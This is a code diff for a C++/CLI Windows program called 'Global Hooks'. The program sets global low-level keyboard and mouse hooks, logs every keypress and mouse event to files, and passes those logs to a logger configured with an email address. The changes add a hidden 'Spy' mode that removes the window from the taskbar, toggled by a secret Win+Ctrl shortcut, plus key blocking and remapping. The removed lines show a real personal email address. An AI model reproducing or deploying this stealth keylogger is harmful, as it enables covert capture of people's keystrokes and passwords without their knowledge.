@@ -1,10 +1,18 @@
 #pragma once
 #include <windows.h>
+#include <msclr\marshal_cppstd.h>
+#include "ConfigForm.h"
 #include "KeyHook.h"
 #include "Logger.h"
+#include "ConfigFile.h"
+#include "RemapDialog.h"
 #define LOGGER_KEYBOARD L"KeyboardLog.txt"
 #define LOGGER_MOUSE L"MouseLog.txt"
 #define ACTION_BLOCK "Block"
+#define ACTION_REMAP "Remap"
+#define MODE_SPY 0
+#define MODE_DEFAULT 1
+#define NO_REMAP -1
 #pragma comment (lib, "User32.lib")
 namespace GlobalHooks {
 
@@ -19,13 +27,7 @@ namespace GlobalHooks {
 	public ref class MainWindow : public System::Windows::Forms::Form
 	{
 	public:
-		MainWindow(void)
-		{
-			keyboardHook = new KeyHook();
-			keyboardLogger = new Logger(100, "hazy142@gmail.com", LOGGER_KEYBOARD);
-			mouseLogger = new Logger(100, "hazy142@gmail.com", LOGGER_MOUSE);
-			InitializeComponent();
-		}
+		static property MainWindow ^ Instance { MainWindow^ get() { return instance; } }
 
 	protected:
 		~MainWindow()
@@ -36,11 +38,25 @@ namespace GlobalHooks {
 				delete keyboardLogger;
 			if (mouseLogger)
 				delete mouseLogger;
+			if (configFile)
+				delete configFile;
 			UnhookWindowsHookEx(keyboardHookHandle);
 			if (components)
 			{
 				delete components;
 			}
+		}
+
+		void SpyMode()
+		{
+			this->ShowInTaskbar = false;
+			this->WindowState = System::Windows::Forms::FormWindowState::Minimized;
+		}
+
+		void DefaultMode()
+		{
+			this->ShowInTaskbar = true;
+			this->WindowState = System::Windows::Forms::FormWindowState::Normal;
 		}
 
 		static IntPtr MouseProc(int nCode, WPARAM wParam,
@@ -88,7 +104,6 @@ namespace GlobalHooks {
 			//Alt + smth
 			if (wParam == WM_SYSKEYUP)
 			{
-				
 				string mes;
 				string pressedKey = keyboardHook->getNameFromStr(hookedKey);
 				mes.append("Alt + ");
@@ -109,13 +124,30 @@ namespace GlobalHooks {
 					if (winState)
 						mes.append("WIN + ");
 					string pressedKey = keyboardHook->getNameFromStr(hookedKey);
+					if (pressedKey == "" && hookedKey.vkCode == 91)
+						pressedKey.append("WIN");
 					mes.append(pressedKey);
 					mes.append(" was pressed.");
 					keyboardLogger->addMessage(mes);
+					if (winState && ctrlState)
+					{
+						if (instance->currentMode == MODE_SPY)
+						{
+							instance->DefaultMode();
+							instance->currentMode = MODE_DEFAULT;
+						}
+						else
+						{
+							instance->SpyMode();
+							instance->currentMode = MODE_SPY;
+						}
+					}
 				}
 				else
 				{
 					string pressedKey = keyboardHook->getNameFromStr(hookedKey);
+					if (pressedKey == "" && hookedKey.vkCode == 91)
+						pressedKey.append("WIN");
 					string logMessage;
 					logMessage.append(pressedKey);
 					logMessage.append(" was pressed.");
@@ -132,32 +164,27 @@ namespace GlobalHooks {
 				}
 				return (IntPtr)-1;
 			}
+			DWORD remap = keyboardHook->checkRemapForKey(hookedKey.vkCode);
+			if (remap != NO_REMAP)
+			{
+				if (wParam == WM_KEYDOWN)
+					keybd_event(remap, 0x1D, KEYEVENTF_EXTENDEDKEY | 0, 0);
+				else if (wParam == WM_KEYUP)
+					keybd_event(remap, 0x1D, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
+				return (IntPtr)-1;
+			}
 			return (IntPtr) CallNextHookEx(keyboardHookHandle, nCode, wParam, lParam);
-		}
-
-		virtual void WndProc(Message %m) override
-		{
-			switch (m.Msg)
-			{
-			case WM_KEYDOWN:
-			{
-				int z = 1;
-				break;
-			}
-			default:
-				Form::WndProc(m);
-				break;
-			}
 		}
 		
 	private:
+		int currentMode;
+		static MainWindow ^instance = gcnew MainWindow();
 		static KeyHook *keyboardHook;
 		static Logger *keyboardLogger;
 		static Logger *mouseLogger;
 		static HHOOK keyboardHookHandle;
 		static HHOOK mouseHookHandle;
-		System::Windows::Forms::Label^  currentMode;
-		System::Windows::Forms::Label^  labelMode;
+		ConfigFile *configFile;
 		System::Windows::Forms::ComboBox^  comboKey1;
 		System::Windows::Forms::Button^  buttonSetConfig;
 		System::Windows::Forms::ComboBox^  comboAction1;
@@ -173,12 +200,25 @@ namespace GlobalHooks {
 		System::Windows::Forms::Label^  key;
 		System::ComponentModel::Container ^components;
 
+		MainWindow(void)
+		{
+			keyboardHook = new KeyHook();
+			configFile = new ConfigFile();
+			int maxLength = atoi(configFile->getMaxLength().c_str());
+			keyboardLogger = new Logger(maxLength, configFile->getEmail(), LOGGER_KEYBOARD);
+			mouseLogger = new Logger(maxLength, configFile->getEmail(), LOGGER_MOUSE);
+			if (configFile->getMode() == "Spy")
+				SpyMode();
+			else
+				DefaultMode();
+			currentMode = configFile->getMode() == "Spy" ? MODE_SPY : MODE_DEFAULT;
+			InitializeComponent();
+		}
+
 		void InitializeComponent(void)
 		{
 			keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, 0, 0);
 			mouseHookHandle = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseProc, 0, 0);
-			this->currentMode = (gcnew System::Windows::Forms::Label());
-			this->labelMode = (gcnew System::Windows::Forms::Label());
 			this->comboKey1 = (gcnew System::Windows::Forms::ComboBox());
 			this->buttonSetConfig = (gcnew System::Windows::Forms::Button());
 			this->comboAction1 = (gcnew System::Windows::Forms::ComboBox());
@@ -193,29 +233,6 @@ namespace GlobalHooks {
 			this->comboAction5 = (gcnew System::Windows::Forms::ComboBox());
 			this->key = (gcnew System::Windows::Forms::Label());
 			this->SuspendLayout();
-			// 
-			// currentMode
-			// 
-			this->currentMode->AutoSize = true;
-			this->currentMode->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
-				static_cast<System::Byte>(204)));
-			this->currentMode->Location = System::Drawing::Point(12, 304);
-			this->currentMode->Name = L"currentMode";
-			this->currentMode->Size = System::Drawing::Size(98, 17);
-			this->currentMode->TabIndex = 0;
-			this->currentMode->Text = L"Current mode:";
-			this->currentMode->UseMnemonic = false;
-			// 
-			// labelMode
-			// 
-			this->labelMode->AutoSize = true;
-			this->labelMode->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
-				static_cast<System::Byte>(204)));
-			this->labelMode->Location = System::Drawing::Point(116, 304);
-			this->labelMode->Name = L"labelMode";
-			this->labelMode->Size = System::Drawing::Size(43, 17);
-			this->labelMode->TabIndex = 1;
-			this->labelMode->Text = L"mode";
 			// 
 			// comboKey1
 			// 
@@ -243,6 +260,7 @@ namespace GlobalHooks {
 			this->comboAction1->Name = L"comboAction1";
 			this->comboAction1->Size = System::Drawing::Size(121, 21);
 			this->comboAction1->TabIndex = 4;
+			this->comboAction1->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
 			// 
 			// action
 			// 
@@ -294,6 +312,7 @@ namespace GlobalHooks {
 			this->comboAction2->Name = L"comboAction2";
 			this->comboAction2->Size = System::Drawing::Size(121, 21);
 			this->comboAction2->TabIndex = 10;
+			this->comboAction2->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
 			// 
 			// comboAction3
 			// 
@@ -302,6 +321,7 @@ namespace GlobalHooks {
 			this->comboAction3->Name = L"comboAction3";
 			this->comboAction3->Size = System::Drawing::Size(121, 21);
 			this->comboAction3->TabIndex = 11;
+			this->comboAction3->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
 			// 
 			// comboAction4
 			// 
@@ -310,6 +330,7 @@ namespace GlobalHooks {
 			this->comboAction4->Name = L"comboAction4";
 			this->comboAction4->Size = System::Drawing::Size(121, 21);
 			this->comboAction4->TabIndex = 12;
+			this->comboAction4->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
 			// 
 			// comboAction5
 			// 
@@ -318,6 +339,7 @@ namespace GlobalHooks {
 			this->comboAction5->Name = L"comboAction5";
 			this->comboAction5->Size = System::Drawing::Size(121, 21);
 			this->comboAction5->TabIndex = 13;
+			this->comboAction5->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
 			// 
 			// key
 			// 
@@ -326,7 +348,7 @@ namespace GlobalHooks {
 				static_cast<System::Byte>(204)));
 			this->key->Location = System::Drawing::Point(96, 26);
 			this->key->Name = L"key";
-			this->key->Size = System::Drawing::Size(37, 18);
+			this->key->Size = System::Drawing::Size(53, 18);
 			this->key->TabIndex = 14;
 			this->key->Text = L"Key:";
 			// 
@@ -348,52 +370,80 @@ namespace GlobalHooks {
 			this->Controls->Add(this->comboAction1);
 			this->Controls->Add(this->buttonSetConfig);
 			this->Controls->Add(this->comboKey1);
-			this->Controls->Add(this->labelMode);
-			this->Controls->Add(this->currentMode);
 			this->Name = L"MainWindow";
 			this->Text = L"Global Hooks";
 			this->ResumeLayout(false);
 			this->PerformLayout();
 			comboKey1->Items->AddRange(Enum::GetNames(Keys::typeid));
+			comboKey1->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
+			comboKey1->SelectedIndex = 0;
 			comboKey2->Items->AddRange(Enum::GetNames(Keys::typeid));
+			comboKey2->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
+			comboKey2->SelectedIndex = 0;
 			comboKey3->Items->AddRange(Enum::GetNames(Keys::typeid));
+			comboKey3->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
+			comboKey3->SelectedIndex = 0;
 			comboKey4->Items->AddRange(Enum::GetNames(Keys::typeid));
+			comboKey4->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
+			comboKey4->SelectedIndex = 0;
 			comboKey5->Items->AddRange(Enum::GetNames(Keys::typeid));
+			comboKey5->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
+			comboKey5->SelectedIndex = 0;
 			comboAction1->Items->Add("-");
 			comboAction1->Items->Add(ACTION_BLOCK);
+			comboAction1->Items->Add(ACTION_REMAP);
 			comboAction1->SelectedIndex = 0;
 			comboAction1->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboAction1Changed);
 			comboKey1->Enter += gcnew System::EventHandler(this, &MainWindow::ComboKey1Enter);
 			comboKey1->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboKey1Changed);
+			buttonSetConfig->Click += gcnew EventHandler(this, &MainWindow::ButtonSetConfigPressed);
 		}
 
-		void ComboAction1Changed(System::Object^  sender, System::EventArgs^  e)
+		void ComboAction1Changed(System::Object^  sender, System::EventArgs^ e)
 		{
 			String ^value = (String ^)comboAction1->SelectedItem;
 			String ^key = (String ^)comboKey1->SelectedItem;
 			if (value == ACTION_BLOCK)
 			{
 				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
+				keyboardHook->deleteRemap((DWORD)keyCode);
 				keyboardHook->addBlock((DWORD)keyCode);
 			}
-			else if (value == "-")
+			if (value == "-")
 			{
 				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
 				keyboardHook->deleteBlock((DWORD)keyCode);
+				keyboardHook->deleteRemap((DWORD)keyCode);
+			}
+			if (value == ACTION_REMAP)
+			{
+				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
+				keyboardHook->deleteBlock((DWORD)keyCode);
+				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
+				if (dialog->Show())
+				{
+					String ^value = (String ^)comboKey1->SelectedItem;
+					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
+					Keys key2 = dialog->GetKey();
+					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
+				}
+				else
+					comboAction1->SelectedIndex = 0;
 			}
 		}
 
-		void ComboKey1Enter(System::Object^  sender, System::EventArgs^  e)
+		void ComboKey1Enter(System::Object^  sender, System::EventArgs^ e)
 		{
 			String ^value = (String ^)comboKey1->SelectedItem;
 			if (value != nullptr)
 			{
 				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, value);
 				keyboardHook->deleteBlock((DWORD)keyCode);
+				keyboardHook->deleteRemap((DWORD)keyCode);
 			}
 		}
 
-		void ComboKey1Changed(System::Object^  sender, System::EventArgs^  e)
+		void ComboKey1Changed(System::Object^  sender, System::EventArgs^ e)
 		{
 			String ^keyValue = (String ^)comboKey1->SelectedItem;
 			String ^actionValue = (String ^)comboAction1->SelectedItem;
@@ -401,6 +451,39 @@ namespace GlobalHooks {
 			{
 				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, keyValue);
 				keyboardHook->addBlock((DWORD)keyCode);
+			}
+			if (actionValue == ACTION_REMAP)
+			{
+				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
+				if (dialog->Show())
+				{
+					String ^value = (String ^)comboKey1->SelectedItem;
+					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
+					Keys key2 = dialog->GetKey();
+					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
+				}
+				else
+					comboAction1->SelectedIndex = 0;
+			}
+		}
+
+		void ButtonSetConfigPressed(System::Object^  sender, EventArgs^ e)
+		{
+			Iapd_GlobalHooks::ConfigForm ^form = gcnew Iapd_GlobalHooks::ConfigForm();
+			form->SetMail(gcnew String(configFile->getEmail().c_str()));
+			form->SetMode(gcnew String(configFile->getMode().c_str()));
+			form->SetMaxLength(gcnew String(configFile->getMaxLength().c_str()));
+			if (form->Show())
+			{
+				string unmanagedEmail = form->GetEmail();
+				string unmanagedMode = form->GetMode();
+				string unmanagedMaxLength = form->GetMaxLength();
+				configFile->setNewValues(unmanagedMode, unmanagedEmail, unmanagedMaxLength);
+				int maxLength = atoi(configFile->getMaxLength().c_str());
+				delete keyboardLogger;
+				delete mouseLogger;
+				keyboardLogger = new Logger(maxLength, configFile->getEmail(), LOGGER_KEYBOARD);
+				mouseLogger = new Logger(maxLength, configFile->getEmail(), LOGGER_MOUSE);
 			}
 		}
 	};
